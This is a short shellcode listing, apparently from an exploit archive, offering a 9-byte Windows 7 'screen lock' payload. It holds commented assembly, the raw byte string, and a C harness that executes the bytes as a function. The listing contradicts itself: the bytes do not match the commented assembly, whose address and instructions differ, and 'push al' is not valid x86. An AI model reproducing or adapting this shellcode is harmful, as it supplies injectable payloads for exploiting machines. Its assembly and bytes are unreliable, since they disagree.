# Title: Windows/7 - Screen Lock Shellcode (9 bytes)
# Author: Saswat Nayak
# Date: 2020-01-22
# Shellcode length 9
# Tested on: Win 7 SP1-64

/*
***** Assembly code follows *****
xor eax,eax
xor ebx,ebx
xor ecx,ecx
mov eax,0x00000002
mov ebx,0x00020000
push ebx
push al
mov ecx,0x77661497
call ecx


*/

char code[]=

"\x31\xC0\xB8\x6F\x86\x67\x77\xFF\xD0";

int main(int argc, char **argv)
 {
int (*func)();
func = (int (*)()) code;
(int)(*func)();
}